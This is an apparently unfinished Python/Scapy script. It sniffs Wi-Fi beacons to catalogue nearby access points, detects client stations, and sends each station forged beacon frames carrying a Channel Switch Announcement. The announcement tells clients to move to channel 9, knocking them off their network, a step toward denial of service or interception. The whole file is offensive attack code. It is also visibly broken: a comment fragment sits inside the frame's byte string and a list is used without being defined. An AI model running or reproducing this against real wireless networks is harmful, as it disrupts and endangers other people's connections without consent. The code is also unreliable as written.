#! /usr/bin/python3
from scapy.all import *

iface = 'wlx9cefd5fa9485'
sta_list = []
ap_mac_list = []
ap_name_list = []
beacon_list = []

ap_phase = True
sta_phase = True
upper_bound = 1000
num_of_csas = 15  ################# use as u seem is best 

BEACON = 8
MANAGEMENT = 0
BROADCAST = 'ff:ff:ff:ff:ff:ff'

def get_all_aps(packet):
	global BEACON, MANAGEMENT, ap_mac_list, ap_name_list
	if packet.haslayer(Dot11) :
		if packet.type == MANAGEMENT and packet.subtype == BEACON :
			if packet.addr2 not in ap_mac_list :
				ap_mac_list.append(packet.addr2)
				ap_name_list.append(packet.info.decode()) # decode because info returns byte class
				beacon_list.append(packet)

def interrupt_station(packet) :
	global BEACON, MANAGEMENT, ap_mac_list, ap_name_list, iface
	found = False
	successful = False
	receiver = packet.addr2
	sender = packet.addr3
	ap_name = 0
	for ap_mac in ap_mac_list :
		if sender == ap_mac :
			found = True
			break
		ap_name = ap_name + 1
	if found :
		print("### mac addr to look for probe req is: ",receiver , " ###")
		print("### press any key to continue ###")
		cont = input()
		
		########## sending CSA routine ##########
		SSID = ap_name_list[ap_name]
		
		pack = beacon_list[ap_name]
		pack.addr1 = receiver
		csa = Dot11Elt(ID=37, info=(
		'\x01'      #Channel switch mode
		'\x09'      #new channel ))					in the future, will be kinda hard to generalize it(maybe send to 5ghz)
		'\x00'))    #channel switch cnt
		frame = pack/csa
		global num_of_csas
		for x in range(num_of_csas):
			sendp(frame, iface=iface)
		########## end of sending CSA ##########
		
		########## how are we doing the sniffing? ##########
		########## how are we doing the sniffing? ##########
		########## how are we doing the sniffing? ##########
		
		# for now i did as if we have another computer whos listening #
		print("### was it successful? ###")
		print("### y if yes, r for repeat, otherwise n or any other key ###")
		answer = input()
		if answer == 'y' : 
			successful = True
			print("### cool so lets continue! ###")
		elif answer == 'r' : 
			successful = interrupt_station(packet)
		else : 
			successful = False 
		return successful
	# maybe found another ap
	else : 
		get_all_aps(packet)
		return successful


########## packet processing ##########
def packet_processing(packet) :
	# addr1 is dst, addr2 is source.
	global BROADCAST, sta_list, ap_mac_list
	if packet.haslayer(Dot11) :
		if  packet.addr2 != None and packet.addr3 != None :
			if packet.addr2 not in sta_list and packet.addr2 not in ap_mac_list:
				ret = interrupt_station(packet)
				if ret :
					sta_list.append(packet.addr2)
					#packet_list.append(packet)
				elif packet.addr1 != None and packet.addr1 != BROADCAST and packet.addr1 not in sta_list and packet.addr1 not in ap_mac_list :
					tmp = packet.addr1
					packet.addr1 = packet.addr2
					packet.addr2 = tmp
					ret = interrupt_station(packet)
					if ret :
						sta_list.append(packet.addr2)
						packet_list.append(packet)
			
			
		
########## end of packet processing ##########




########## sniffing aps and stations ##########
# filter to get only beacons?? didnt find the right filter... #
print("######## we are starting with aps! ########")
while upper_bound > 0 : 
	upper_bound = upper_bound - 1
	capture = sniff(iface = iface, prn = get_all_aps, count = 1)

print("### aps list is: ###")
print(ap_mac_list)


print("######## we continue with stations! ########")
counter = 1
while sta_phase :
	capture = sniff(iface = iface, prn = packet_processing, count = 1)
	counter = counter + 1
	if counter == 1000 :
		# checking if we want more and get answer y/any
		counter = 1
		print("### shall we continue my friend? ###")
		print("### y if yes, otherwise n or any other key ###")
		answer = input()
		if answer != 'y' : 
			break
		
print("### all stations captured are: ###")
print(sta_list)
print("### writing something to a file too? think about it ###")


########## end of sniffing ##########

